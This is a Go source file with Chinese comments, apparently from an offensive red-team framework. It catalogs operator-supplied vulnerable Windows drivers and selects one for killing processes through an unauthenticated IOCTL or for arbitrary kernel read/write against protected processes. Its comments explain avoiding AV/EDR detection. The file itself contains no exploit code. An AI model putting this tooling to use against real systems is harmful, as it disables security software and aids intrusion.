// Package drivers 管理 **操作员自备** 的 BYOVD 驱动（v1.3.3 起不再内置任何驱动）。
//
// 为什么不再内置：内置驱动意味着**服务端与载荷里都带着驱动名与 IOCTL 明文**，
// 既是稳定的静态特征（多数 AV/EDR 直接按易受攻击驱动名告警），也让我们背上第三方
// 二进制的分发与合规负担。现在改为「驱动由操作员提供、元数据由操作员声明」：
//
//	release/drivers/                随包目录，放自己的 *.sys（可选）
//	release/drivers/manifest.json   可选，描述每个驱动的元数据
//	data/drivers/                   运行时目录（也可放这里）
//
// manifest.json 形如：
//
//	{
//	  "drivers": [
//	    {
//	      "file": "yourdriver.sys",
//	      "name": "yourdriver",
//	      "purpose": "kill",              // kill = 提供进程终止 IOCTL；rw = 任意内核读写；both = 两者兼顾
//	      "service": "yourdriver",         // SCM 服务名
//	      "device": "\\\\.\\yourdriver",    // 设备路径
//	      "ioctl": "0x222048",             // 终止进程的 IOCTL（支持十六进制字符串或数字）
//	      "kill_pid_size": 4,              // IOCTL 入参 PID 字段字节数
//	      "description": "用途备注",
//	      "signed": "签名者（人工核对用）",   // 签名**声明**：也可写 true/false（v1.4.0 S6）
//	      "signer": "显式签名者",            // 可选：等价于 signed=<该签名者>
//	      "require_signature": false,       // 可选：true = 实测签名无效/声明不符时**硬拒**下发
//	      "sha256": "…"                    // 可选：期望哈希，加载前自检会比对（见 verify.go）
//	    }
//	  ]
//	}
//
// purpose 决定**下发时的选路**（见 route.go）：byovd_kill 要 kill/both 档，ppl_kill 要 rw/both 档；
// 多驱动时按「档位专一度 → 档案名 → 文件名 → 路径」确定性地挑一个，挑不到就明确拒绝并给出中文原因。
// signed/signer/require_signature 只表达"操作员的签名声明"，与实测结论的关系见 signature.go。
//
// 没有 manifest 时 List() 仍会列出目录里的 .sys（元数据留空，UI 会提示补全）；
// sha256 一律实时计算，便于操作员加载前自行核对。
//
// 每个驱动还会带上加载前自检结果（Verify 字段）：sha256 与 manifest 声明是否一致、
// Authenticode 签名是否有效、本机易受攻击驱动黑名单是否启用。自检复用的是上面那次
// 读取结果，不会为了算哈希把同一个文件读两遍。
//
// ⚠️ 仅供授权红队/渗透测试使用；加载驱动前请自行确认签名与来源合法。
package drivers

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
)

// Driver 描述一个可用驱动。
type Driver struct {
	Name        string `json:"name"`
	File        string `json:"file"`
	Description string `json:"description"`
	// Purpose 用途：kill = 无鉴权进程终止 IOCTL；rw = 任意内核读写（PPL 场景）。
	Purpose string `json:"purpose"`
	Device  string `json:"device"`
	Service string `json:"service"`
	// IOCTL 终止进程的 IOCTL 码（METHOD_BUFFERED，入参首个 DWORD = PID）。
	IOCTL uint32 `json:"ioctl"`
	// KillPIDSize 终止 IOCTL 的 PID 字段字节数（InputBufferLength 校验用，默认 4）。
	KillPIDSize uint32 `json:"kill_pid_size"`
	Size        int64  `json:"size"`
	SHA256      string `json:"sha256"`
	Signed      string `json:"signed"`
	// Signature manifest 的**签名声明**（人工声明；实测结论见 Verify）。
	// 与 Signed 的关系：Signed 是兼容字段（= 声明的签名者字符串），
	// Signature 把"是否声明已签名 / 是否要求签名有效"也表达出来。
	Signature SignatureDeclaration `json:"signature"`
	// Verify 加载前自检结果（sha256 一致性 / 签名状态 / 易受攻击驱动黑名单提示）。
	// 与上面的 Signed（manifest 里人工标注的签名者）不同，Verify.Signed 是本机实测结论；
	// 非 Windows 平台只有一个「不做自检」的警告，其余字段为零值。
	Verify *VerifyResult `json:"verify,omitempty"`
	// Path 磁盘绝对路径（供下载/加载任务使用）。
	Path string `json:"-"`
	// manifest 命中的声明（未命中为零值）。**内部字段**：List() 需要它来拿
	// 期望 sha256 与声明签名者，但对外 JSON 里已经有展开后的同名字段，不需要重复输出。
	manifest manifestEntry `json:"-"`
}

// manifestEntry 是 manifest.json 里的单条驱动声明。
type manifestEntry struct {
	File        string      `json:"file"`
	Name        string      `json:"name"`
	Description string      `json:"description"`
	Purpose     string      `json:"purpose"`
	Device      string      `json:"device"`
	Service     string      `json:"service"`
	IOCTL       interface{} `json:"ioctl"`
	KillPIDSize uint32      `json:"kill_pid_size"`
	// Signed 签名声明：兼容 v1.3.4 的"签名者字符串"写法，并支持 true/false
	// （见 signature.go 的 signedDecl）。**这是人工声明，不是实测结论。**
	Signed signedDecl `json:"signed"`
	// Signer 显式签名者（可选；写了它就等于声明"已签名 + 该签名者"）。
	Signer string `json:"signer"`
	// RequireSignature 声明"实测签名必须有效"（require_signature:true）：
	// 把"声明与实测不一致"从警告升级为硬拒。默认 false（见 SignatureConsistency 的理由）。
	RequireSignature bool `json:"require_signature"`
	// SHA256 可选：期望的 sha256（十六进制小写/大写均可），加载前自检据此判断文件是否被替换/损坏。
	SHA256 string `json:"sha256"`
}

// manifestFile manifest.json 结构。
type manifestFile struct {
	Drivers []manifestEntry `json:"drivers"`
}

// SearchDirs 返回扫描驱动的目录（按优先级）：
//  1. 服务端可执行文件同目录的 drivers/（发布包布局）
//  2. 当前工作目录的 drivers/
//  3. data/drivers/（运行时放置）
func SearchDirs() []string {
	var dirs []string
	if exe, err := os.Executable(); err == nil {
		dirs = append(dirs, filepath.Join(filepath.Dir(exe), "drivers"))
	}
	dirs = append(dirs, filepath.Join(".", "drivers"), filepath.Join("data", "drivers"))

	seen := map[string]bool{}
	out := make([]string, 0, len(dirs))
	for _, d := range dirs {
		abs, err := filepath.Abs(d)
		if err != nil || seen[abs] {
			continue
		}
		seen[abs] = true
		out = append(out, abs)
	}
	return out
}

// List 列出所有可用驱动（.sys 实时算 sha256，元数据来自同目录 manifest.json）。
func List() []Driver {
	var out []Driver
	for _, d := range scanSysFiles() {
		// 只读一次盘：sha256 与实际内容都来自这一份 raw，加载前自检复用同一份字节。
		var raw []byte
		if b, err := os.ReadFile(d.Path); err == nil {
			raw = b
			d.SHA256 = sha256Hex(b)
		}
		meta := d.manifest
		// 加载前自检（复用上面已读入内存的字节与已解析的 manifest，不重复读盘）。
		// 签名声明一并传进去：声明与实测的一致性判定需要它（见 signature.go）。
		res := verifyWithRawDecl(d.Path, raw, meta.SHA256, meta.declaration())
		d.Verify = &res
		d.manifest = manifestEntry{} // 内部字段不外泄
		out = append(out, d)
	}
	return out
}

// scanSysFiles 扫描 SearchDirs 下的 *.sys 并套用同目录 manifest.json 的元数据，
// **不读驱动字节、不算 sha256、不验签名**（那个由 List 与 VerifyBytes 负责）。
//
// 存在的意义见 Summary：av-ops 的可用性预览是"每次刷新页面都会调"的端点，
// 不能承担 Authenticode 校验的成本。
func scanSysFiles() []Driver {
	var out []Driver
	seen := map[string]bool{}
	for _, dir := range SearchDirs() {
		meta := readManifest(dir)
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || !strings.EqualFold(filepath.Ext(e.Name()), ".sys") {
				continue
			}
			path := filepath.Join(dir, e.Name())
			if seen[strings.ToLower(path)] {
				continue
			}
			seen[strings.ToLower(path)] = true

			d := Driver{Name: strings.TrimSuffix(e.Name(), filepath.Ext(e.Name())), File: e.Name(), Path: path}
			if info, err := e.Info(); err == nil {
				d.Size = info.Size()
			}
			d.manifest = matchManifest(e.Name(), &d, meta)
			if d.KillPIDSize == 0 {
				d.KillPIDSize = 4
			}
			out = append(out, d)
		}
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Name < out[j].Name })
	return out
}

// matchManifest 在 manifest 里找该文件的声明并套用到 d 上，返回命中的声明
// （未命中返回零值）。抽出来是因为 List 与 scanSysFiles 都要用同一份匹配口径 ——
// 两边各写一遍迟早会在"按 file 还是按 name 匹配"上漂移。
func matchManifest(fileName string, d *Driver, meta manifestFile) manifestEntry {
	for _, m := range meta.Drivers {
		if !strings.EqualFold(m.File, fileName) && (m.Name == "" || !strings.EqualFold(m.Name, d.Name)) {
			continue
		}
		if m.Name != "" {
			d.Name = m.Name
		}
		d.Description = m.Description
		d.Purpose = m.Purpose
		d.Device = m.Device
		d.Service = m.Service
		d.IOCTL = parseIOCTL(m.IOCTL)
		d.KillPIDSize = m.KillPIDSize
		// 兼容字段 Signed = 声明里的签名者；显式 signer 字段也算（declaration() 已做收敛）。
		decl := m.declaration()
		d.Signed = decl.Signer
		d.Signature = decl
		return m
	}
	return manifestEntry{}
}

// ProfileSummary 驱动**档位摘要**：只读目录清单与 manifest.json，回答
// "这台机器上有没有可用的 kill 档 / rw 档驱动"，不做哈希与签名自检。
//
// 为什么需要一条"便宜路径"（而不是直接复用 List）：List 会对每个 .sys 跑一次
// Authenticode 校验，而 verify_windows.go 的软超时（SignatureTimeout=4s）**超时结论不入
// 缓存**（验证失败的结论不该被缓存），因此放了 N 个驱动的机器上单次 List 最坏要 N×4 秒。
// 把它放进"每次刷新页面都会调"的可用性预览端点，会直接撞爆 HTTP 写超时（默认 30s）。
//
// ⚠️ 因此本摘要的结论是"**按声明**可用"：真正的加载前自检在下发时执行
// （byovd_load 走 VerifyBytes 硬校验，GET /drivers/{name}/verify 给人工核对）。
// 预览说"有 rw 档驱动"而下发时自检不通过，是允许的差异 —— 预览负责"有没有配"，
// 自检负责"配得对不对"，两者都不应该被对方替代。
type ProfileSummary struct {
	SearchDirs []string
	Total      int
	// Drivers 全部驱动的**元数据**（无 SHA256/Verify）。供按名字/设备名做便宜查找，
	// 例如分级入口解析 byovd_kill 的 driver 参数时不必触发完整自检。
	Drivers []Driver
	// Kill：能提供无鉴权进程终止 IOCTL 的档位（purpose ∈ {kill, both} 且 device+ioctl 齐全）。
	Kill *Driver
	// RW：具备任意内核读写的档位（purpose ∈ {rw, both}）。PPL 清除需要它。
	RW *Driver
	// Purposes 出现的档位集合（便于前端提示"你放的驱动没写 purpose"）。
	Purposes []string
	// Signatures 签名**声明**的汇总（只看 manifest 声明，不做签名校验）。
	// 为什么放在预览里：可用性预览是便宜路径（不跑 WinVerifyTrust），
	// 但"这台机器上放的驱动有几个没声明签名"是纯 manifest 事实，可以顺便显示出来，
	// 让操作员在点下发之前就知道自己的驱动目录配得全不全。
	Signatures SignatureSummary
}

// SignatureSummary 驱动目录里签名声明的分布（**声明，不是实测**）。
type SignatureSummary struct {
	// DeclaredSigned 声明已签名（signed 为字符串/true，或只写了 signer）。
	DeclaredSigned int `json:"declared_signed"`
	// DeclaredUnsigned 显式声明未签名（signed:false）。
	DeclaredUnsigned int `json:"declared_unsigned"`
	// Undeclared 完全没写签名信息（前端应提示补全）。
	Undeclared int `json:"undeclared"`
	// RequireSignature 声明 require_signature:true 的数量（实测不满足会被硬拒）。
	RequireSignature int `json:"require_signature"`
	// Note 口径说明（避免把声明当实测结论）。
	Note string `json:"note"`
}

// Summary 给出驱动档位摘要（便宜路径，见 ProfileSummary 的说明）。
func Summary() ProfileSummary {
	out := ProfileSummary{SearchDirs: SearchDirs()}
	purposes := map[string]bool{}
	var cands []Driver
	for _, d := range scanSysFiles() {
		out.Total++
		out.Drivers = append(out.Drivers, d)
		cands = append(cands, d)
		if d.Purpose != "" {
			purposes[strings.ToLower(d.Purpose)] = true
		}
		switch d.Signature.Declared {
		case SignatureSigned:
			out.Signatures.DeclaredSigned++
		case SignatureUnsigned:
			out.Signatures.DeclaredUnsigned++
		default:
			out.Signatures.Undeclared++
		}
		if d.Signature.Require {
			out.Signatures.RequireSignature++
		}
	}
	out.Signatures.Note = "只统计 manifest.json 的签名**声明**（便宜路径，不做 Authenticode 校验）；" +
		"实测签名结论请用 GET /api/v1/drivers/{name}/verify（含声明与实测是否一致）"
	// 档位选择与下发选路共用同一份确定性顺序（见 selectProfile）：
	// 两处口径必须一致，否则"预览说有 kill 档"与"下发时挑到别的驱动"会互相打架。
	if d, ok := selectProfile(cands, PurposeKill, true); ok {
		dup := d
		out.Kill = &dup
	}
	if d, ok := selectProfile(cands, PurposeRW, false); ok {
		dup := d
		out.RW = &dup
	}
	for p := range purposes {
		out.Purposes = append(out.Purposes, p)
	}
	sort.Strings(out.Purposes)
	return out
}

// FindMeta 在摘要里按名字或文件名查找驱动元数据（不读盘、不验签）。
func (s ProfileSummary) FindMeta(name string) (Driver, bool) {
	name = strings.TrimSpace(name)
	for _, d := range s.Drivers {
		if d.Name == name || d.File == name ||
			(strings.EqualFold(d.Name, name) || strings.EqualFold(d.File, name)) {
			return d, true
		}
	}
	return Driver{}, false
}

// FindByService 按 SCM 服务名查档案（byovd_unload 的选路用）。
// 匹配顺序：service 精确（忽略大小写）→ 名字 → 文件名。都没有则返回 false，
// 调用方应继续按"手工加载的驱动"处理，而不是直接拒绝（见 route.go 的 byovd_unload）。
func (s ProfileSummary) FindByService(service string) (Driver, bool) {
	svc := strings.TrimSpace(service)
	if svc == "" {
		return Driver{}, false
	}
	for _, d := range s.Drivers {
		if strings.EqualFold(strings.TrimSpace(d.Service), svc) {
			return d, true
		}
	}
	return s.FindMeta(svc)
}

// Names 返回目录里全部档案名（按名字排序），供"点名了一个不存在的驱动"时列出候选。
// 为什么要在错误里列候选：操作员最常见的失败是名字打错或 .sys 没放进目录，
// 直接把当前有哪些写出来，比让他再去调一次 GET /api/v1/drivers 省一步。
func (s ProfileSummary) Names() []string {
	out := make([]string, 0, len(s.Drivers))
	for _, d := range s.Drivers {
		out = append(out, d.Name)
	}
	sort.Strings(out)
	return out
}

// selectProfile 纯逻辑：按"档位需求"从候选里挑**唯一确定**的那个驱动。
//
// 顺序（多驱动时必须确定，不允许靠目录遍历顺序碰运气）：
//  1. 档位专一度：恰好是所需档位的优先于 both 档（kill 需要 kill 档；PPL 需要 rw 档，
//     把"兼顾两用"的 both 当作后备 —— 专用驱动更可能是操作员为这个用途准备的）；
//  2. 档案名（不区分大小写）；
//  3. 文件名（不区分大小写）；
//  4. 磁盘路径（不区分大小写）。
//
// needDeviceIOCTL=true 时还要求 device+ioctl 齐全（byovd_kill 的终止 IOCTL 是必需参数：
// 选一个没有 IOCTL 的 kill 档驱动，下发出去必然失败）。
//
// Summary.Kill/RW 与 Route 都用它，保证"预览"与"下发"挑到同一个驱动。
func selectProfile(cands []Driver, need string, needDeviceIOCTL bool) (Driver, bool) {
	var ok []Driver
	for _, d := range cands {
		if !purposeSatisfies(d.Purpose, need) {
			continue
		}
		if needDeviceIOCTL && (strings.TrimSpace(d.Device) == "" || d.IOCTL == 0) {
			continue
		}
		ok = append(ok, d)
	}
	if len(ok) == 0 {
		return Driver{}, false
	}
	sort.SliceStable(ok, func(i, j int) bool {
		ri, rj := purposeRank(ok[i].Purpose, need), purposeRank(ok[j].Purpose, need)
		if ri != rj {
			return ri < rj
		}
		ni, nj := strings.ToLower(ok[i].Name), strings.ToLower(ok[j].Name)
		if ni != nj {
			return ni < nj
		}
		fi, fj := strings.ToLower(ok[i].File), strings.ToLower(ok[j].File)
		if fi != fj {
			return fi < fj
		}
		return strings.ToLower(ok[i].Path) < strings.ToLower(ok[j].Path)
	})
	return ok[0], true
}

// Find 按名称或文件名取驱动元数据（含加载前自检结果，不返回文件字节）。
// 与 Get 的区别：Get 会额外把 .sys 读进内存，仅需要元数据/自检结论时用 Find 更省 IO。
func Find(name string) (Driver, error) {
	for _, d := range List() {
		if d.Name == name || d.File == name {
			return d, nil
		}
	}
	return Driver{}, fmt.Errorf("未找到驱动 %q：请把 .sys 放到 %s（可选配 manifest.json 声明设备名/服务名/IOCTL）",
		name, strings.Join(SearchDirs(), " 或 "))
}

// Get 按名称或文件名取驱动与其字节内容。
func Get(name string) (Driver, []byte, error) {
	for _, d := range List() {
		if d.Name == name || d.File == name {
			raw, err := os.ReadFile(d.Path)
			if err != nil {
				return d, nil, err
			}
			return d, raw, nil
		}
	}
	return Driver{}, nil, fmt.Errorf("未找到驱动 %q：请把 .sys 放到 %s（可选配 manifest.json 声明设备名/服务名/IOCTL）",
		name, strings.Join(SearchDirs(), " 或 "))
}

// KillProfile 返回可用于「进程终止」的驱动档案（purpose ∈ {kill, both} 且已填 device+ioctl）。
// 没有可用档案时返回 false —— 此时 byovd_kill 必须由调用方显式提供设备名与 IOCTL。
//
// v1.4.0 S6 P0-1 起它只是 selectProfile 的薄封装：**选路口径与下发路径（route.go 的 Route）
// 完全同一份**。此前它只认 purpose=kill，会把 purpose=both 的通用驱动排除在外 ——
// 那是"预览/路由/下发各写一套"的典型症状（同一份目录，两条路径给出不同结论）。
// 这里改为共用 selectProfile（kill 优先、both 后备），并走完整自检（List）。
func KillProfile() (Driver, bool) {
	return selectProfile(List(), PurposeKill, true)
}

func readManifest(dir string) manifestFile {
	var m manifestFile
	raw, err := os.ReadFile(filepath.Join(dir, "manifest.json"))
	if err != nil {
		return m
	}
	_ = json.Unmarshal(raw, &m)
	return m
}

// parseIOCTL 兼容 "0x222048"（字符串）与 2236488（数字）两种写法。
func parseIOCTL(v interface{}) uint32 {
	switch t := v.(type) {
	case float64:
		return uint32(t)
	case string:
		s := strings.TrimSpace(t)
		if s == "" {
			return 0
		}
		if n, err := strconv.ParseUint(strings.TrimPrefix(strings.ToLower(s), "0x"), 16, 32); err == nil {
			return uint32(n)
		}
		if n, err := strconv.ParseUint(s, 10, 32); err == nil {
			return uint32(n)
		}
	}
	return 0
}
